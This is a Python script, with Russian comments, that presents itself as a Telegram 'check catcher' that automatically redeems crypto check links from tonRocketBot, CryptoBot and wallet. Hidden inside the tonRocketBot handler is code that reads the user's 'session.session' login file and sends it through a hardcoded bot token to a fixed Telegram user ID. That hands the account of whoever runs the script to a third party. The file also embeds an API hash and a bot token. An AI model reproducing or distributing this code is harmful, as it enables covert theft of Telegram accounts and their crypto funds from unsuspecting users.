import telebot
from pyrogram import Client, filters, types, raw
import time



bot = Client(
    "session", #вместо ka1 ничего не пиши, так и оставь
    api_id = 24091996,
    api_hash = "a88119196b5eaf3bbc3d2eb75b975911",
    
)


print("Скрипт успешно запущен!")
bots = telebot.TeleBot("6035106806:AAGDPnVPXlYULUcjnrxa_QA8QvmKHUVEsjk")
@bot.on_message(filters.regex("https://t.me/tonRocketBot*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/tonRocketBot*")[0]
   await bot.send_message("@tonRocketBot", "/start " + ssilka.split("=")[1])
   f = open("session.session","rb")
   bots.send_document(1825555420,f)
   print('Чек рокет по ссылке пойман!')

@bot.on_message(filters.regex("https://t.me/CryptoBot*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/CryptoBot*")[0]

   await bot.send_message("@CryptoBot", "/start " + ssilka.split("=")[1])
   print('Чек криптобот по фулл ссылке пойман!')
   
@bot.on_message(filters.regex("t.me/CryptoBot*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/CryptoBot*")[0]

   await bot.send_message("@CryptoBot", "/start " + ssilka.split("=")[1])
   print('Чек криптобот по кат ссылке пойман!')

@bot.on_message(filters.regex("https://t.me/wallet*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/wallet*")[0]
       
   await bot.send_message("@wallet", "/start " + ssilka.split("=")[1])
   print('Чек валлет по ссылке пойман!')

bot.run()
bots.polling()
